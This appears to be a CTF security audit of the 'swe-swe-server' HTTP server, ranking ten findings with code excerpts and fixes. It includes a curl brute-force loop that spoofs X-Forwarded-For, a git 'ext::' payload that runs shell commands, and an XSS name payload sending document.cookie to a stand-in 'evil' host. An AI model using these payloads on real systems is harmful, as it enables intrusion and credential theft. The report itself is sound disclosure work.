# CTF: swe-swe Vulnerability Report

Target: the embedded HTTP server `swe-swe-server` (source of truth is
`cmd/swe-swe/templates/host/swe-swe-server/`, embedded into the binary and
re-emitted by `swe-swe init`). All line references are to those template
files, not the generated golden copies.

## Threat model

In "dockerfile-only" / tunnel mode the server enforces its own auth: a single
shared password (`SWE_SWE_PASSWORD`) gates everything except a handful of
exempt paths (`auth.go:428-459`). A logged-in user legitimately gets a full
terminal in the container, so the **authentication boundary itself is the crown
jewel** — anything that weakens login, or that an unauthenticated / cross-site
attacker can reach, is the highest-value bug. Per-session secrets (git PATs,
SSH signing keys) held in memory (`cred_store.go`, `sign_store.go`) are the
secondary prize.

Findings are ranked by real-world severity.

---

## 1. Login rate-limiter is trivially bypassed → unlimited password brute force (HIGH)

`authLoginPostHandler` keys its rate limiter on the client-supplied
`X-Forwarded-For` header, falling back to `RemoteAddr` only when the header is
absent:

```go
// auth.go:350-357
clientIP := r.Header.Get("X-Forwarded-For")
if clientIP == "" {
    clientIP = r.RemoteAddr
}
if idx := strings.Index(clientIP, ","); idx != -1 {
    clientIP = strings.TrimSpace(clientIP[:idx])
}
```

The limiter (`authRateLimiter.allow/record`, `auth.go:43-67`) then buckets by
that attacker-controlled string. Sending a unique `X-Forwarded-For` on every
request puts each attempt in its own bucket, so the 10-attempts/5-min cap
(`auth.go:27-28`) never trips.

The shared password is the **only** authentication secret, there is no account
lockout, no CAPTCHA, and no second factor. With the limiter neutralized, an
attacker can brute-force the password at full speed.

PoC:
```
for p in $(cat wordlist); do
  curl -s -o /dev/null -w '%{http_code}\n' \
    -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" \
    --data-urlencode "password=$p" \
    https://target/swe-swe-auth/login
done   # 302 == success
```

Aggravating factor: in tunnel mode the real request always arrives from
`127.0.0.1` (tunneld on localhost), so without spoofing **all** users collapse
into one `127.0.0.1` bucket and lock each other out — the header is consulted
precisely because the peer IP is useless, which is exactly why trusting it is
unsafe. Fix: derive the throttle key from the trusted transport peer (or a
proxy header only when a trusted proxy is configured), and add a global
failed-attempt ceiling independent of any per-IP key.

## 2. WebSocket accepts all origins (`CheckOrigin` always true) (HIGH/MEDIUM)

```go
// main.go:84-90
var upgrader = websocket.Upgrader{
    ...
    CheckOrigin: func(r *http.Request) bool {
        return true // Allow all origins for development
    },
}
```

`/ws/{uuid}` is the control channel for a session: it spawns the agent process,
streams terminal output both ways, accepts file uploads, and accepts
`set_credentials` (which loads a git PAT / SSH key into the session — see
`main.go:5345`). With no origin check, any web page a victim visits can open a
WebSocket back to the server. Cookies are attached by the browser on the
handshake, so wherever the gating cookie is delivered cross-site (notably
compose/Traefik `ForwardAuth` mode, whose cookie SameSite policy is set
outside this code), the attacker page drives the victim's terminal, reads its
output, and can plant credentials — a full session takeover (Cross-Site
WebSocket Hijacking).

The embedded-auth cookie is `SameSite=Lax` (`auth.go:384`), which blunts the
pure cross-site case, but "allow all origins" is the wrong default and removes
the one server-side defense that does not depend on cookie policy. Fix:
validate `Origin` against an allow-list (the apex host and its
`{port}.{publicHostname}` subdomains).

## 3. Open redirect after login via the `redirect` parameter (MEDIUM)

```go
// auth.go:347, 389-392
redirectURL := r.FormValue("redirect")
...
if redirectURL == "" {
    redirectURL = "/"
}
http.Redirect(w, r, redirectURL, http.StatusFound)
```

`redirect` is never constrained to a local, same-origin path. A link such as
`https://target/swe-swe-auth/login?redirect=https://evil.example` shows the
genuine swe-swe login form and, on success, bounces the freshly-authenticated
user to the attacker site — strong phishing / OAuth-style token-relay primitive
because it happens on the trusted origin right after auth. Fix: reject values
that are not a single-leading-slash relative path (and explicitly reject `//`,
`/\`, and scheme-bearing values).

## 4. `git clone` runs an attacker-controlled URL → `ext::` transport RCE / local file read (MEDIUM)

`handleRepoPrepareClone` validates only the *directory name* via
`sanitizeRepoURL`, then passes the **raw** URL to git:

```go
// main.go:3511
cmd := exec.Command("git", "clone", url, repoPath)
```

`sanitizeRepoURL` (`main.go:3194-3218`) merely rewrites filesystem-unsafe
characters to build a folder name and returns non-empty for almost any input,
so it does not gate the clone. Git's `ext::` transport executes a shell
command, giving code execution:

```
POST /api/repo/prepare
{"mode":"clone","url":"ext::sh -c touch$IFS/tmp/pwned"}
```

`file://` URLs additionally turn this into arbitrary local-repo read. This is
post-auth, but the "prepare repo" feature is meant to be a constrained
clone-a-URL action, not an arbitrary-command sink; it also widens what a
stolen/forged cookie or a CSWSH (finding #2) can do. Fix: require an explicit
scheme allow-list (`https://`, `git@host:`…), reject `ext::`/`file://`/leading
`-`, and pass `--` before the URL.

## 5. Stored XSS in the chat-playback page title (MEDIUM)

`handleChatPlaybackPage` interpolates the recording's name straight into HTML
with `fmt.Fprintf` and no escaping:

```go
// main.go:6719-6735 (condensed)
title := "Chat Playback"
if metaData, err := os.ReadFile(metaPattern); err == nil {
    ... title = meta.Name + " -- Chat"
}
fmt.Fprintf(w, `...<title>%s</title>...`, title, ...)
```

The session **rename** path validates characters (`main.go:5262-5268`, no `<`),
but the **initial** name taken from the `name` query param at session creation
is stored into `Metadata.Name` unvalidated (`main.go:5038` → `p.Name` →
`name := p.Name` at `main.go:4584` → `Metadata{Name: name}` at
`main.go:4771`). A session created with
`name=</title><script>fetch('//evil/?'+document.cookie)</script>` persists that
payload in `…/recordings/session-*.metadata.json`; anyone who later opens
`/recording/{uuid}/chat` executes it. The homepage is safe because it renders
through auto-escaping `html/template`; this hand-rolled page is the lone sink.
Fix: `html.EscapeString(title)` (and validate name once at creation, matching
the rename rules).

## 6. Host-header open redirect in the ForwardAuth verify handler (MEDIUM)

`authVerifyHandler` builds the login redirect from request-supplied forwarded
headers and emits it as `Location`:

```go
// auth.go:402-417 (condensed)
scheme := r.Header.Get("X-Forwarded-Proto"); if scheme == "" { scheme = "http" }
host   := r.Header.Get("X-Forwarded-Host");  if host == "" { host = r.Host }
loginURL := scheme + "://" + host + "/swe-swe-auth/login?redirect=" + url.QueryEscape(redirectURI)
w.Header().Set("Location", loginURL)
```

A request with `X-Forwarded-Host: evil.example` (and any `X-Forwarded-Proto`)
to `/swe-swe-auth/verify` yields a 302 to
`https://evil.example/swe-swe-auth/login?...`. Where the verify endpoint is
reachable directly (it is auth-exempt, `auth.go:435`), this is an open
redirect / login-form-spoofing primitive. Fix: build the redirect from a
configured canonical host, not from untrusted forwarded headers.

## 7. Session cookie is a non-revocable bearer token signed over a timestamp only (MEDIUM/LOW)

```go
// auth.go:92-96
timestamp := fmt.Sprintf("%d", time.Now().Unix())
signature := authComputeHMAC(timestamp, secret)
return timestamp + "|" + signature
```

The cookie binds to nothing but the issue time: no user id, no random session
id, no version/nonce. Consequences:

- **No revocation / logout.** Any captured cookie is valid for the full 7 days
  (`auth.go:24`); there is no way to invalidate it short of changing the
  password (which rotates the HMAC key for everyone).
- **HMAC key == the password**, so two deployments sharing a password issue
  interchangeable cookies, and the cookie's security collapses to password
  entropy (compounding finding #1).
- The `Secure` flag is decided from `X-Forwarded-Proto` / `SWE_COOKIE_SECURE`
  and defaults to **false** (`auth.go:292-300`), so on a plain-HTTP hop the
  long-lived cookie travels in cleartext.

Fix: sign a random per-session id you can revoke server-side, separate the
signing key from the password, and default `Secure` on.

## 8. `mcpAuthKey` compared non-constant-time and carried in URLs (LOW)

The shared MCP/API key gates the auth-exempt endpoints, but every comparison is
a plain `!=`:

```go
// main.go:2020      if r.URL.Query().Get("key") != mcpAuthKey {
// main.go:7684      if key := r.URL.Query().Get("key"); key == "" || key != mcpAuthKey {
// autocomplete.go:35 if key := r.URL.Query().Get("key"); key == "" || key != mcpAuthKey {
```

Unlike the password check (which correctly uses `subtle.ConstantTimeCompare`),
these leak timing. More practically, the key is passed in the **query string**
(`?key=…`) for `/mcp`, `/api/autocomplete/{uuid}`, and
`/api/session/{uuid}/browser/start`, so it lands in proxy/access logs, browser
history, and `Referer` headers — a far easier path to disclosure than a timing
oracle. The key itself is 32 random bytes (`main.go:1915-1917`), which is good;
the handling is the weak point. Fix: constant-time compare and move the key to
a header.

## 9. CSRF: state-changing endpoints rely solely on SameSite=Lax, and fork is a GET (LOW)

None of the mutating endpoints carry a CSRF token; they trust the cookie.
`SameSite=Lax` blocks cross-site POSTs, but `/api/fork/{uuid}` is a **GET** that
creates/stages a new session and 302s into it:

```go
// main.go:2313 routes /api/fork/ ; handleSessionForkAPI requires GET (main.go:7310)
```

Lax cookies *are* sent on top-level cross-site GET navigations, so an attacker
page can force a victim's browser to `GET /api/fork/<known-uuid>` and spin up
sessions. Low direct impact, but mutating actions should never be GET, and the
mutating APIs should require a CSRF token rather than leaning entirely on cookie
SameSite policy.

## 10. Credential broker authorizes by PID ancestry on a world-reachable socket (LOW/MEDIUM)

The broker hands out the session's git PAT and performs SSH signing for any
connecting process whose `/proc` parent chain reaches a registered session
shell (`broker.go:57-76, 104-186`) on the abstract-namespace unix socket
`@swe-swe-broker` (`broker.go:29, 81-100`). Abstract unix sockets ignore
filesystem permissions, so **every** process in the container's network
namespace can connect; the only gate is the ancestry walk. The agent process
the session runs is itself the thing we are trying to constrain, yet it sits
*inside* the trusted ancestry, so it can ask the broker for the raw PAT
(`op:"get"`) and SSH signatures (`op:"sign-ssh"`) at will — the "browser
write-only, secrets only flow out to git" intent stated in `cred_store.go:10-13`
does not actually hold against in-container code. The 32-step ancestry walk
also makes PID-reuse confusion plausible under churn. Fix: bind secrets to a
verified credential-helper invocation (e.g. a per-session nonce passed through
the helper) rather than to "any descendant," and prefer a filesystem socket
with restrictive perms over the abstract namespace.

---

## Also worth fixing (lower severity / hardening)

- **Agent argv injection.** `extra_args` from the WS query is whitespace-split
  and appended to the agent command (`main.go:5084`, `buildAgentArgv`
  `main.go:5636-5642`); an authenticated client can inject arbitrary CLI flags
  into the agent binary. Post-auth, but worth constraining.
- **Auth-exempt suffix matching.** `authMiddleware` exempts any path matching
  `/api/session/` + `…/browser/start` and the whole `/api/autocomplete/` prefix
  (`auth.go:434-442`). These do enforce the API key today, but the exemptions
  are matched by string prefix/suffix on the un-normalized path — a fragile
  pattern; pin them to exact route handlers.
- **Rate-limiter memory under spoofing.** Because finding #1 lets each request
  invent a new key, `authLoginLimiter.attempts` grows one map entry per unique
  spoofed IP between the 10-minute cleanups (`auth.go:70-88`) — a minor memory
  amplification lever.
